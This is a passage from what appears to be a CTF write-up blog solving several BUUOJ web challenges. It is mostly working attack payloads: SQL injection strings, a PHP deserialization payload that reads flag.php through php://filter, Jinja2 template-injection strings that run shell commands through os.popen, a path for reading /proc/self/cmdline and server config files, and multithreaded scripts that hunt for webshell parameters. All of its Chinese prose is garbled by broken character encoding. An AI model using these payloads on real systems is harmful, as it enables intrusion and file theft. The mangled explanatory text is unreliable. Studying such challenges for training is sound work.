<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=<span class="string">&#x27;^(updatexml(1,concat(0x7e,(select(right(password,20))from(H4rDsq1)),0x7e),1))%23&amp;password=&#x27;</span><span class="number">123456</span></span><br><span class="line"></span><br><span class="line">XPATH syntax <span class="built_in">error</span>: <span class="string">&#x27;~flag&#123;e4a637e3-26a3-40b8-9d97-dda1f2df2d00&#125;~&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="äºŒåã€-GXYCTF2019-BabySQli"><a href="#äºŒåã€-GXYCTF2019-BabySQli" class="headerlink" title="äºŒåã€[GXYCTF2019]BabySQli"></a>äºŒåã€[GXYCTF2019]BabySQli</h3><p>è¿™é“é¢˜çš„è§£é¢˜æ€è·¯æºäºä¸€ç¯‡ç†Šæµ·ä»£ç å®¡è®¡æ–‡ç« [<a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=MzAxNzkyOTgxMw==&mid=2247485081&idx=1&sn=d4c7a4abfabef333c9879400ec91db31&chksm=9bdf45a3aca8ccb5de027516ca76c68affae33edbe36bd37a33d0ef5b064be4d94823da01015&mpshare=1&scene=23&srcid=11160K6GexBQhwGXXguR8zc8&sharer_sharetime=1605511748454&sharer_shareid=5c34ea9eacb30dd992454894a04902a5#rd">å…¥é—¨çº§CMSå®¡è®¡â€”â€”å“ˆæ‹‰å°‘å®‰å…¨å°é˜Ÿ(å…¬ä¼—å·)</a>]</p>
<p>Payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="number">1</span><span class="string">&#x27;%20unioN%20sElect%201,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span><span class="number">202</span>cb962ac59075b964b07152d234b70<span class="string">&#x27;%23&amp;pw=123</span></span><br></pre></td></tr></table></figure>

<p>Flagï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b48393e7<span class="number">-6</span>bcd<span class="number">-491e-89</span>d4<span class="number">-47</span>db442b201d&#125;</span><br></pre></td></tr></table></figure>

<h3 id="äºŒåä¸€ã€-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#äºŒåä¸€ã€-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="äºŒåä¸€ã€[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>äºŒåä¸€ã€[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h3><p>1ã€PHP7.1+ååºåˆ—åŒ–æ—¶å¯¹ç±»å±æ€§çš„è®¿é—®æ§åˆ¶å…³é”®å­—æ£€æµ‹ä¸æ˜¯éå¸¸ä¸¥æ ¼ï¼Œå¸¦æœ‰protectã€privateè®¿é—®æ§åˆ¶å…³é”®å­—çš„å˜é‡ç»è¿‡åºåˆ—åŒ–åæ­£å¸¸å¸¦æœ‰%00çš„ï¼Œåœ¨é¢˜ç›®ä¸­is_valid()æ˜¯é™åˆ¶äº†32-127çš„ASCIIç æ‰èƒ½è¿›è¡Œååºåˆ—åŒ–ã€‚å› æ­¤åœ¨PHP7+ç‰ˆæœ¬ä¸­å¯ä»¥æ„é€ è¿™äº›ç‰¹æ®Šè®¿é—®æ§åˆ¶å…³é”®å­—çš„å˜é‡ä¸ºpublicå˜é‡ï¼Œpublicå˜é‡åºåˆ—åŒ–åæ˜¯æ²¡æœ‰%00çš„ï¼Œå¹¶ä¸”ååºåˆ—åŒ–åä¹Ÿæ­£å¸¸ã€‚é¢˜ç›®ä¸­æ‰€ä½¿ç”¨çš„PHPç¯å¢ƒæ˜¯PHP7.4.3,å› æ­¤å¯è¡Œã€‚</p>
<p>2ã€ååºåˆ—åŒ–æ„é€ file_get_contentä½¿ç”¨php://filterè¯»å‡ºflag.phpä¸­çš„flag</p>
<p>3ã€i:2æ•°å­—ç±»å‹å¯¹è±¡å±æ€§ç»•è¿‡_destructé­”æœ¯æ–¹æ³•å…¨ç­‰é€»è¾‘</p>
<p>Payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str=O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">52</span>:<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p>Flagï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgJGZsYWc9J2ZsYWd7NTY1NGFlZTAtZGY4My00ZWU5LWIxYTYtZWI2NTRlMWE5YjFkfSc7Cg==</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span> $flag=<span class="string">&#x27;flag&#123;5654aee0-df83-4ee9-b1a6-eb654e1a9b1d&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>æ³¨ï¼šåœ¨ç½‘é¼æ¯ä¸­ï¼Œé¢˜ç›®éœ€è¦è‡ªè¡Œè¯»å–ç³»ç»Ÿæ–‡ä»¶æ¥å¾—åˆ°ç½‘ç«™æ ¹ç›®å½•è¯»å–flagï¼Œè¿™é‡Œå­¦ä¹ åˆ°ï¼š/proc/self/cmdlineæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶è®°å½•æŸè¿›ç¨‹æ‰€æ‰§è¡Œçš„å‘½ä»¤è¡Œï¼Œselfæ˜¯æŒ‡å½“å‰è¿›ç¨‹ã€‚å¾—åˆ°æ ¹ç›®å½•çš„æ­¥éª¤ï¼š/proc/self/cmdline -&gt; /web/config/httpd.conf -&gt; /web/html/flag.php</strong></p>
<h3 id="äºŒåäºŒã€-BJDCTF-2nd-fake-google"><a href="#äºŒåäºŒã€-BJDCTF-2nd-fake-google" class="headerlink" title="äºŒåäºŒã€[BJDCTF 2nd]fake google"></a>äºŒåäºŒã€[BJDCTF 2nd]fake google</h3><p>Flaskæ¨¡æ¿æ³¨å…¥</p>
<p>æ¼æ´æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request,render_template_string,render_template</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>]=<span class="string">&#x27;sssssssSFSCFAS&#x27;</span></span><br><span class="line"><span class="meta">@app.route(&quot;/qaq&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;null&#x27;</span>)</span><br><span class="line">    t = <span class="string">&quot;&lt;!--ssssssti &amp; a little trick --&gt; P3&#x27;s girlfirend is : &#123;&#125;&lt;br&gt;&lt;hr&gt;&quot;</span>.format(name)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;BJD&quot;</span> <span class="keyword">in</span> render_template_string(t): <span class="comment">#just a trick</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;BJD in P3&#x27;s gf&#x27;s name !!!!!???&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;DJB&quot;</span> <span class="keyword">in</span> render_template_string(t):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;DJB in P3&#x27;s gf&#x27;s name !!!!!???&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(t)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>Payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/qaq?name=&#123;&#123;[].<span class="keyword">__class__</span>.__base__.__subclasses__()[<span class="number">169</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/qaq?name=&#123;% <span class="keyword">for</span> c in [].<span class="keyword">__class__</span>.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.<span class="keyword">__class__</span> == &#123;&#125;.<span class="keyword">__class__</span> %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">endfor</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/qaq?name=&#123;% <span class="keyword">for</span> c in [].<span class="keyword">__class__</span>.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="keyword">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;&#123;% <span class="keyword">endif</span> %&#125;&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure>

<p>Flagï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;eaa9f2c0<span class="number">-0</span>aea<span class="number">-47</span>ac<span class="number">-9</span>da2<span class="number">-297</span>c0566d208&#125;</span><br></pre></td></tr></table></figure>

<h3 id="äºŒåä¸‰ã€-å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#äºŒåä¸‰ã€-å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="äºŒåä¸‰ã€[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>äºŒåä¸‰ã€[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h3><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/Dm5hwt"><img src="https://s3.ax1x.com/2020/11/18/Dm5hwt.png" alt="Dm5hwt.png"></a></p>
<p>â€‹    ç‰¹å˜æ€ï¼2000å¤šä¸ªæ–‡ä»¶ï¼Œä¸Šä¸‡ä¸ªå¯ä¼ å‚æ•°ï¼Œå…¶ä¸­å¯èƒ½æœ‰æŸä¸ªå‚æ•°å¯Getshellï¼    </p>
<p>â€‹    è¿™ä¸ªè„šæœ¬æ•²äº†å‡ ä¹ä¸€ä¸‹åˆâ€¦å­¦ä¹ äº†ä¸€ä¸‹pythonå¤šçº¿ç¨‹ä¸tpdmåº“è¿›åº¦æ¡çš„ç”¨æ³•ï¼Œå¹¶ä¸”å¯¹æ­£åˆ™è¡¨è¾¾å¼çš„ä½¿ç”¨è¿›ä¸€æ­¥å­¦ä¹ ã€‚</p>
<p><strong>è‡ªå·±æ•²ç‰ˆæœ¬1</strong>ï¼šä»¥å±é™©å‚æ•°ä¸ºå•ä½æ­£åˆ™è¿›è¡Œæ„é€ payloadã€å•çº¿ç¨‹ï¼ˆæ…¢!!!ï¼‰</p>
<p><strong>è‡ªå·±æ•²ç‰ˆæœ¬2</strong>ï¼šgetshellæœ¬è´¨ä¸å°±æ˜¯ä¼ å…¥å‚æ•°å˜›ï¼è·å¾—æ¯ä¸ªæ–‡ä»¶ä¸­æ‰€æœ‰GETã€POSTå‚æ•°æ¥æµ‹è¯•GETSHELLå³å¯ï¼æ¯ä¸ªæ–‡ä»¶çš„æ¯ä¸ªGETå‚æ•°æˆ‘éƒ½requestä¸€æ¬¡ï¼Œå¤šçº¿ç¨‹ï¼ˆæ…¢!!ï¼‰</p>
<p><strong>å­¦ä¹ æ•²ç‰ˆæœ¬3</strong>ï¼šæ˜æ˜httpåè®®å¯ä»¥ä¸€æ¬¡æ€§ä¼ å…¥å¤šä¸ªå‚æ•°å•Šï¼ææ¯›!requestæ˜¯æœ€å æ—¶é—´çš„ï¼Œä¸€æ¬¡æ€§è·å¾—ä¸€ä¸ªæ–‡ä»¶æ‰€æœ‰å‚æ•°ï¼ˆåŒ…æ‹¬POSTä½†æˆ‘è¿™é‡Œåªæµ‹è¯•äº†GETçš„ä¸€å¥è¯ï¼‰ï¼Œç„¶ååªä¼ ä¸€æ¬¡å°±OKäº†å•Šï¼æ—¶é—´å¤æ‚åº¦ç›´æ¥é™äº†ä¸€ä¸ªé‡çº§ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">author: 2h0nG</span></span><br><span class="line"><span class="string">description:Only test &quot;GET&quot; param. In fact, &quot;POST&quot; param also should be tested.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> re, requests, os</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">thread_get_shell</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, file_</span>):</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.content = open(dir_name+file_, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">        self.file_ = file_</span><br><span class="line">        self.url = url</span><br><span class="line"></span><br><span class="line">    <span class="comment">#æ‰§ç€çš„æ‰§è¡Œä¸€ä¸ªHTTPè¯·æ±‚ï¼Œç›´åˆ°æœåŠ¡å™¨æ¢å¤200çŠ¶æ€ç ï¼Œä¸”è®°å½•é”™è¯¯ä¿¡æ¯åœ¨error.log</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">real_request</span>(<span class="params">self, params</span>):</span></span><br><span class="line">        error_log = open(os.path.dirname(__file__)+<span class="string">&#x27;\error.log&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        respon = requests.get(url+self.file_, params = params)</span><br><span class="line">        <span class="keyword">while</span> respon.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">                error = <span class="string">&#x27;page &#x27;</span> + str(respon.status_code) + <span class="string">&#x27;: &#x27;</span> + respon.request.url + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                error_log.write(error)</span><br><span class="line">                <span class="comment">#print(&#x27;\n\033[0;31;40mpage &#x27; + str(respon.status_code) + &#x27;: &#x27; + respon.request.url + &#x27;\033[0m&#x27;)</span></span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">            respon = requests.get(url+self.file_, params = params)</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        error_log.close()</span><br><span class="line">        <span class="keyword">return</span> respon</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        pattern = re.compile(<span class="string">r&quot;(?&lt;=\$_GET\[&#x27;)[a-zA-Z0-9]+(?=&#x27;\])&quot;</span>)  </span><br><span class="line">        params = &#123;&#125;</span><br><span class="line">        all_keys = set(pattern.findall(self.content))</span><br><span class="line">        <span class="comment">#å°†å½“å‰phpæ–‡ä»¶ä¸­æ‰€æœ‰å¯ä¼ GETå‚æ•°çš„keyä¿å­˜ä¸ºdictï¼Œä¸€æ¬¡æ€§å…¨éƒ¨å‘é€æµ‹è¯•getshell</span></span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> all_keys:</span><br><span class="line">            params[key] = <span class="string">&quot;echo zhongjiacheng&quot;</span></span><br><span class="line">        respon = self.real_request(params)</span><br><span class="line">        <span class="comment">#ä¸€æ—¦å‘ç°æˆåŠŸgetshellï¼Œåˆ™é€ä¸ªè§£æå‡ºå¯†ç å‚æ•°</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;zhongjiacheng&#x27;</span> <span class="keyword">in</span> respon.text:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> all_keys:</span><br><span class="line">                respon = self.real_request(&#123;i : <span class="string">&#x27;echo zhongjiacheng&#x27;</span>&#125;)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;zhongjiacheng&#x27;</span> <span class="keyword">in</span> respon.text:</span><br><span class="line">                    success = <span class="string">&quot;webshell ==&gt; &quot;</span> + self.file_ + <span class="string">&quot; ; key = &quot;</span> + i + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">                    print(<span class="string">&quot;\n\033[0;32;40mwebshell ==&gt; &quot;</span> + self.file_ + <span class="string">&quot; ; key = &quot;</span> + i + <span class="string">&#x27;\033[0m&#x27;</span>)</span><br><span class="line">                    open(os.path.dirname(__file__)+<span class="string">&#x27;\success.log&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>).write(success)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    dir_name = <span class="string">&quot;C:/Users/18265/Downloads/www/src/&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://8c7e3e67-09dd-4fc4-be24-00ea25216166.node3.buuoj.cn/&quot;</span></span><br><span class="line">    files = os.listdir(dir_name)</span><br><span class="line">    all_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(dir_name)]</span><br><span class="line">    <span class="keyword">for</span> file_index <span class="keyword">in</span> tqdm(files[<span class="number">0</span>:]):</span><br><span class="line">        <span class="keyword">while</span> threading.active_count() &gt; <span class="number">100</span>:</span><br><span class="line">           <span class="keyword">continue</span></span><br><span class="line">        th_get = thread_get_shell(url, file_index)</span><br><span class="line">        th_get.start()</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/DmfHSJ"><img src="https://s3.ax1x.com/2020/11/18/DmfHSJ.png" alt="DmfHSJ.png"></a></p>
<p>Flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c3ee43f0-baa5<span class="number">-42</span>b2-bb82-e3af2a05e58f&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ³¨ï¼šå¦å¤–æˆ‘çš„è„šæœ¬å¤šçº¿ç¨‹æ˜¯ä»¥classä¸ºå•ä½ï¼Œè¿™é‡ŒCopyæŸä½å¤§ä½¬çš„ä»¥å‡½æ•°ä¸ºå•ä½çš„å¤šçº¿ç¨‹pythonè„šæœ¬ï¼Œä»¥ä¾›æœªæ¥ä½¿ç”¨ã€‚è¿™é‡Œæœ‰ä¸€ç‚¹ä¸æ¸…æ¥šçš„æ˜¯å¯¹äºpythonå˜é‡ä½œç”¨åŸŸçš„é—®é¢˜ï¼Œä¸‹é¢å±•ç¤ºçš„è„šæœ¬é™åˆ¶çº¿ç¨‹æ•°çš„æ–¹æ³•æ˜¯ä½¿ç”¨äº†ä¿¡å·é‡ï¼Œè¿™é‡Œçš„ä¿¡å·é‡å˜é‡å…¨å±€æœ‰æ•ˆï¼Œä¸”çº¿ç¨‹é—´å…±äº«ã€‚ä»¥Classä¸ºå•ä½æ²¡æœ‰æƒ³å‡ºçº¿ç¨‹é—´å…±äº«å…¨å±€ä¿¡å·é‡å˜é‡çš„æ–¹æ³•ã€‚</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">print(<span class="string">&#x27;å¼€å§‹æ—¶é—´ï¼š  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)                                            <span class="comment">#è¿™å„¿è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°</span></span><br><span class="line">filePath = <span class="string">r&quot;C:/Users/18265/Downloads/www/src/&quot;</span></span><br><span class="line">os.chdir(filePath)                                                    <span class="comment">#æ”¹å˜å½“å‰çš„è·¯å¾„</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>                                <span class="comment">#è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>                                             <span class="comment"># è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()                                                </span><br><span class="line">    print(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> open(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:                            <span class="comment">#æ‰“å¼€phpæ–‡ä»¶ï¼Œæå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•°</span></span><br><span class="line">        gets = list(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">        posts = list(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;                                                        <span class="comment">#æ‰€æœ‰çš„$_POST</span></span><br><span class="line">    params = &#123;&#125;                                                        <span class="comment">#æ‰€æœ‰çš„$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://bc614ec1-f50c-4a4e-befa-badae1940973.node3.buuoj.cn/src/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)            <span class="comment">#ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST</span></span><br><span class="line">    req.close()                                                <span class="comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:                                    <span class="comment">#å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°ï¼Œç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•°</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()                                                <span class="comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()                                                <span class="comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag 